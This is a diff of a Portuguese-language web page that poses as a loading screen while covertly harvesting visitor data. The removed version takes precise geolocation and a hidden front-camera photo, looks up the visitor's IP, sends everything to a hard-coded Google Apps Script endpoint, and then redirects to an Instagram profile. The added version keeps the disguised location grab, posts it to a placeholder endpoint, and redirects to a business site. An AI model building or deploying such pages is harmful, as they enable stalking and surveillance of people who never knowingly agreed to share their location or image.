@@ -1,242 +1,76 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Localizando e Capturando...</title>
-  <style>
-    body {
-      background-color: #000;
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-      box-sizing: border-box;
-    }
-    p {
-      padding: 10px;
-      margin: 5px;
-      word-wrap: break-word;
-      max-width: 90%;
-    }
-    video {
-      display: none; /* Mantém o vídeo oculto, usado apenas para capturar o frame */
-      width: 320px;
-      height: 240px;
-      background-color: #333;
-    }
-    canvas {
-      display: none; /* Mantém o canvas oculto */
-    }
-  </style>
-  <script>
-    let videoStream = null; 
-    
-    // ATENÇÃO: SUBSTITUA 'SEU_WEBAPP_URL_AQUI' PELA URL REAL DO SEU WEB APP DO GOOGLE APPS SCRIPT
-    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbwyWteTCdY6ZQFzb--K-lwR8yst_afaDOoz1Zk64Se-BZvselEXoOgLgkK9mFSU9IkX_Q/exec'; 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carregando...</title>
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+    </style>
+    <script>
+        // INSERIRA AQUI A URL DA SUA NOVA IMPLANTAÇÃO DO APPS SCRIPT
+        const WEB_APP_URL = "SUA_URL_DO_APPS_SCRIPT_AQUI";
 
-    // LINK FINAL DE REDIRECIONAMENTO: atualmente para o Instagram
-    const REDIRECT_URL = 'https://www.instagram.com/s1tes_ninna/'; // Você pode mudar este link se precisar
-
-    window.onload = function() {
-      console.log("Página carregada. Iniciando processo...");
-      updateStatus("📍 Obtendo sua localização... Aguarde...");
-      
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sucessoLocalizacao, erroLocalizacao, {
-          enableHighAccuracy: true,
-          timeout: 15000, // Tenta obter por 15 segundos
-          maximumAge: 0 // Não usa localização em cache
-        });
-      } else {
-        updateStatus("<p>Seu navegador não suporta geolocalização.</p>");
-        console.warn("Geolocalização não suportada.");
-        iniciarCapturaCamera(null, null); // Continua o processo sem localização
-      }
-    };
-
-    function updateStatus(message) {
-      document.body.innerHTML = message;
-    }
-
-    function addStatus(message) {
-      document.body.innerHTML += message;
-    }
-
-    function sucessoLocalizacao(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      console.log(`Localização obtida: Lat ${latitude}, Lng ${longitude}`);
-      updateStatus(`<p>✅ Localização obtida!</p>`);
-      iniciarCapturaCamera(latitude, longitude);
-    }
-
-    function erroLocalizacao(err) {
-      console.error("Erro na geolocalização:", err);
-      let msg = "<p⚠️ Erro desconhecido na geolocalização.</p>";
-      if (err.code === 1) {
-        msg = "<p>❌ Acesso à localização negado. Por favor, permita.</p>";
-      } else if (err.code === 2) {
-        msg = "<p>🌐 Localização indisponível. Sinal fraco ou problema no dispositivo.</p>";
-      } else if (err.code === 3) {
-        msg = "<p>⌛ Tempo limite para obter localização excedido.</p>";
-      }
-      updateStatus(msg);
-      iniciarCapturaCamera(null, null); // Continua mesmo com erro de localização
-    }
-
-    async function iniciarCapturaCamera(latitude, longitude) {
-      console.log("Iniciando captura da câmera...");
-      addStatus("<p>📷 Solicitando acesso à câmera... Aguarde...</p>");
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: "user", // Tenta usar a câmera frontal
-                width: { ideal: 640 }, 
-                height: { ideal: 480 } 
-            } 
-        });
-        videoStream = stream; // Guarda o stream para poder parar depois
-
-        const video = document.createElement('video');
-        video.autoplay = true;
-        video.playsInline = true; // Importante para reprodução em iOS
-        video.srcObject = stream;
-        // Não é necessário adicionar o vídeo ao DOM se for apenas para captura invisível
-
-        video.onloadedmetadata = () => {
-            video.play(); 
-            console.log("Stream de vídeo carregado e reproduzindo.");
-            addStatus("<p>✅ Câmera acessada!</p>");
-            setTimeout(() => {
-                capturarImagem(latitude, longitude);
-            }, 1500); // Espera 1.5 segundos para a câmera estabilizar
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // Solicita apenas a localização do dispositivo
+                navigator.geolocation.getCurrentPosition(sucessoLocalizacao, erroLocalizacao, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                console.log("Geolocalização não suportada.");
+                redirecionarUsuario();
+            }
         };
 
-        video.onerror = (e) => {
-            console.error("Erro no elemento de vídeo:", e);
-            updateStatus("<p>❌ Erro no stream de vídeo da câmera.</p>");
-            enviarDadosParaSheets(latitude, longitude, null); // Continua sem imagem se o vídeo falhar
-        };
+        function sucessoLocalizacao(position) {
+            const dados = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                timestamp: new Date().toLocaleString("pt-BR")
+            };
 
-      } catch (err) {
-        console.error("Erro ao acessar a câmera (getUserMedia):", err);
-        let cameraErrorMsg = "<p>❌ Erro ao acessar a câmera. Certifique-se de permitir o acesso.</p>";
-        if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
-          cameraErrorMsg = "<p>🚫 Acesso à câmera negado. Por favor, permita nas configurações do navegador/dispositivo.</p>";
-        } else if (err.name === "NotFoundError") {
-          cameraErrorMsg = "<p>📸 Nenhuma câmera encontrada ou disponível.</p>";
-        } else if (err.name === "AbortError") {
-          cameraErrorMsg = "<p>⚠️ O acesso à câmera foi abortado.</p>";
-        } else if (err.name === "NotReadableError") {
-          cameraErrorMsg = "<p>🔒 A câmera já está em uso por outro aplicativo.</p>";
+            // Envia os dados estritamente via método POST
+            fetch(WEB_APP_URL, {
+                method: "POST",
+                mode: "no-cors", // Evita problemas de CORS com o Google Apps Script
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(dados)
+            })
+            .then(() => {
+                console.log("Dados enviados.");
+                redirecionarUsuario();
+            })
+            .catch(error => {
+                console.error("Erro no envio:", error);
+                redirecionarUsuario();
+            });
         }
-        updateStatus(cameraErrorMsg);
-        enviarDadosParaSheets(latitude, longitude, null); // Continua sem imagem se a câmera falhar
-      }
-    }
 
-    function capturarImagem(latitude, longitude) {
-      console.log("Tentando capturar imagem do stream...");
-      const video = document.createElement('video'); // Cria o elemento de vídeo temporariamente para captura
-      video.srcObject = videoStream; // Atribui o stream atual
-      
-      // Garante que o vídeo esteja pronto para captura (pode precisar de um breve play/pause ou delay)
-      // Para o propósito de captura rápida, o drawImage é feito logo.
-      
-      const canvas = document.createElement('canvas');
-      // Define o tamanho do canvas com base no tamanho do vídeo
-      canvas.width = video.videoWidth > 0 ? video.videoWidth : 640; 
-      canvas.height = video.videoHeight > 0 ? video.videoHeight : 480;
-      const context = canvas.getContext('2d');
-
-      // Desenha o frame atual do vídeo no canvas
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const imageDataURL = canvas.toDataURL('image/jpeg', 0.8); // Converte para Base64 (JPG, qualidade 80%)
-      console.log("Imagem Base64 gerada. Tamanho:", imageDataURL.length, "caracteres.");
-
-      if (videoStream) {
-        console.log("Parando stream da câmera.");
-        videoStream.getTracks().forEach(track => track.stop()); // Interrompe todas as trilhas do stream (vídeo, áudio)
-        videoStream = null;
-      }
-      // Não precisa remover o vídeo do DOM se ele nunca foi adicionado.
-
-      addStatus(`<p>📸 Imagem capturada!</p>`);
-      enviarDadosParaSheets(latitude, longitude, imageDataURL);
-    }
-
-    async function enviarDadosParaSheets(latitude, longitude, imageDataURL) {
-      console.log("Iniciando envio de dados para o Google Sheets...");
-      addStatus(`<p>🚀 Enviando dados...</p>`);
-      let ip = 'Não detectado';
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        ip = data.ip;
-        console.log("IP obtido:", ip);
-      } catch (error) {
-        console.error("Erro ao obter IP:", error);
-      }
-
-      // Constrói o link para o Google Maps
-      const mapsLink = latitude && longitude ? `https://www.google.com/maps?q=${latitude},${longitude}` : 'Localização não disponível';
-      console.log("Link do Maps:", mapsLink);
-
-      const payload = {
-        timestamp: new Date().toISOString(), 
-        latitude: latitude,
-        longitude: longitude,
-        ip: ip,
-        maps: mapsLink,
-        imagem: imageDataURL || 'N/A' // Se não houver imagem, envia 'N/A'
-      };
-      console.log("Payload a ser enviado:", payload);
-
-      try {
-        const response = await fetch(WEBAPP_URL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(payload)
-        });
-
-        if (response.ok) {
-          const responseData = await response.json(); 
-          console.log("Dados enviados com sucesso para o Google Sheets:", responseData);
-          addStatus(`<p>✅ Dados enviados!</p>`);
-        } else {
-          const errorText = await response.text();
-          console.error(`Erro ${response.status} ao enviar dados para o Google Sheets:`, errorText);
-          addStatus(`<p>❌ Erro ao enviar dados (Status: ${response.status}).</p>`);
+        function erroLocalizacao(error) {
+            console.warn("Permissão recusada ou erro obtendo localização:", error.message);
+            redirecionarUsuario();
         }
-      } catch (error) {
-        console.error("Erro de rede ou ao processar resposta do Google Sheets:", error);
-        addStatus(`<p>❌ Erro de conexão ao enviar dados. Tente novamente.</p>`);
-      } finally {
-        // Redireciona para o link final, independente do sucesso do envio dos dados
-        redirecionaInstagram(); 
-      }
-    }
 
-    function redirecionaInstagram() {
-      console.log("Redirecionando para o Instagram...");
-      addStatus("<p>➡️ Redirecionando...</p>");
-      setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-      }, 2500); // Espera 2.5 segundos antes de redirecionar para dar tempo de exibir a última mensagem
-    }
-  </script>
+        function redirecionarUsuario() {
+            // Insira aqui o site de destino final do usuário
+            window.location.href = "https://www.despachanteespindola.com/";
+        }
+    </script>
 </head>
 <body>
-  <p>Iniciando...</p>
+    <p>Carregando conteúdo, por favor aguarde...</p>
 </body>
 </html>
